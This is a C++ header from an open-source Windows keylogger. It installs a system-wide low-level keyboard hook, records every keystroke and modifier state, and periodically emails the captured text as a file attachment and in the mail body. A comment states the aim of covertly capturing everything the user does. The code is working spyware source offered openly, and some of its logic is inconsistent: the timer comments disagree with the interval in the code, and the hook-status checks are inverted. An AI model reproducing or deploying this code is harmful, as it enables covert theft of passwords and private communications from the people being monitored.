/*
 *  C++ lib\KeyHook.h
 *  Lucas Barbosa | 2017 | Open source software
 */

#ifndef KEYHOOK_H_INCLUDED
#define KEYHOOK_H_INCLUDED

/*
 *  This source code file handles the capuring of the keyhooks purely using
 *  the windows api and windows data structs and types. Also handles timed
 *  mail sendings.
 */

#include <iostream>
#include <fstream>
#include <windows.h>

using namespace std;

// all keystrokes are saved into 'keylog', and flushed out when mail is sent
std::string keylog = "";

// timer_send_mail will send mail every 2 minutes with the recorded keys
void timer_send_mail()
{
  if (keylog.empty())
  {
    // blank return
    return;
  }
  std::string last_file = IO::write_log<std::string>(keylog);

  // if empty string is returned from the keylog file then send to debug log file
  if (last_file.empty())
  {
    Helper::write_app_log("File creation was not successful, Keylog '" + keylog + "'");
    return;
  }
  std::string test_body = "Hi :)\nThe File has been attached to this mail :)\n For testing purposed enjoy!\n" + keylog;
  int mail_send_result = Mail::send_mail("Log [" + last_file + "]", test_body, IO::get_our_path(true) + last_file);

  if (mail_send_result != 7)
  {
    // write to our debbuging file
    Helper::write_app_log("Mail was not sent! Error code: " + Helper::to_string(mail_send_result));
  }

    // clear the contents of the keylogged values to avoid duplication (seriously annoying)
    keylog = "";

}

// 500 * 60 = 30 seconds
Timer mail_timer(timer_send_mail, 250 * 60, Timer::Infinite);

// pointer to our key hook, useful to propagate the hook to other functions
HHOOK e_hook = NULL;

/*
 *  [LRESULT] KeyboardProc(<code>, <wParam>, <lParam>);
 *
 *  <code [in] Type: int>
 *  A code the hook procedure uses to determine how to process the message.
 *  If code is less than zero, the hook procedure must pass the message to
 *  the CallNextHookEx function without further processing and should return
 *  the value returned by CallNextHookEx.
 *
 *  <wParam [in] Type: WPARAM>
 *  The virtual-key code of the key that generated the keystroke message.
 *
 *  <lParam [in] Type: LPARAM>
 *  The repeat count, scan code, extended key flag and the context code.
 *  Basic information and flags associated with the keys.
 *
 *  For mor info try the docs @ https://msdn.microsoft.com/en-us/library/windows/desktop/ms644984(v=vs.85).aspx
 */

LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
  if (nCode < 0)
  {
    CallNextHookEx(e_hook, nCode, wparam, lparam);
  }

  KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam;

  // We need to know which keys were pressed during a shift state
  if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
  {
    // appends keys to our keylog string (which will be saved to a file) from our KeyConstants map
    keylog += Keys::KEY_MAP[kbs->vkCode].trivial_key_name;

    // If someone does press enter on their keyboard not to log it, but actually write a newline
    if (kbs->vkCode == VK_RETURN)
    {
      keylog += '\n';
    }
  }// Checking for when the keys are UP: in state of shift
  else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
  {
    DWORD key = kbs->vkCode;
    if (
        // All posible shift states
           key == VK_CONTROL
        || key == VK_LCONTROL
        || key == VK_RCONTROL
        || key == VK_SHIFT
        || key == VK_RSHIFT
        || key == VK_LSHIFT
        || key == VK_MENU
        || key == VK_LMENU
        || key == VK_RMENU
        || key == VK_CAPITAL
        || key == VK_NUMLOCK
        || key == VK_LWIN
        || key == VK_RWIN
       )
    {
      // translating our virtual key values (vkCodes) into their trivial key names (human readable format)
      std::string key_name = Keys::KEY_MAP[kbs->vkCode].trivial_key_name;

      // inserting backslashes in between shift states
      key_name.insert(1, "/");
      keylog += key_name;
    }
  }
  // once keys are grabbed make sure to propagate them onwards to the system
  return CallNextHookEx(e_hook, nCode, wparam, lparam);
}

bool install_hook()
{
  Helper::write_app_log("Hook Started... Timer Started");
  mail_timer.start_timer(true);

  /*
   *  [HHOOK] SetWindowsHookEx(<idHook>, <lpfn>, <hMod>, <dwThreadId>);
   *
   *  <idHook [in] Type: int>
   *  Installs a hook procedure that monitors low-level keyboard input
   *  events. For more information, see the LowLevelKeyboardProc
   *  hook procedure.
   *
   *  <lpfn [in] Type: HOOKPROC>
   *  Pointer to a hook procedure. Must be casted to type <HOOKPROC>,
   *  if lpfn does not point to a hook procedure in a DLL it will point
   *  to a hook procedure associated with the code of the current process.
   *
   *  <hMod [in] Type: HINSTANCE>
   *  A handle to the DLL containing the hook procedure pointed to by the
   *  lpfn parameter. The hMod parameter must be set to NULL if the dwThreadId
   *  parameter specifies a thread created by the current process and if the hook
   *  procedure is within the code associated with the current process.
   *
   *  <dwThreadId [in] Type: DWORD>
   *  The indentifier of the thread of which the hook procedure is to be associated.
   *  For desktop apps if this parameter is 0 the hook procedure is associated with
   *  all exising threads running in the same desktop as the calling THREAD. Which is
   *  exactly what we want from this keylogger. For it to run asynchronously in the
   *  background capturing everything the user is doing.
   *
   *  For more info try the docs @ https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990(v=vs.85).aspx
   */

  /*
   *  if functions succeeds in capturing the hook procedure, it will return the HANDLE to the `hook procedure,
   *  if the function fails to capture the hook procedure it will evaluate to NULL
   */
  e_hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);

  return e_hook == NULL;
}

bool uninstall_hook()
{
  /*
   *  <BOOL>
   *  typdef int BOOL (just a regular windows API boolean value)
   */
  BOOL curr_hook_procedure = UnhookWindowsHookEx(e_hook);
  e_hook = NULL;
  // boolean conversion
  return (bool)curr_hook_procedure;
}

bool is_hooked()
{
  // check if hook is hooked
  return (bool)(e_hook == NULL);
}

#endif // KEYHOOK_H_INCLUDED
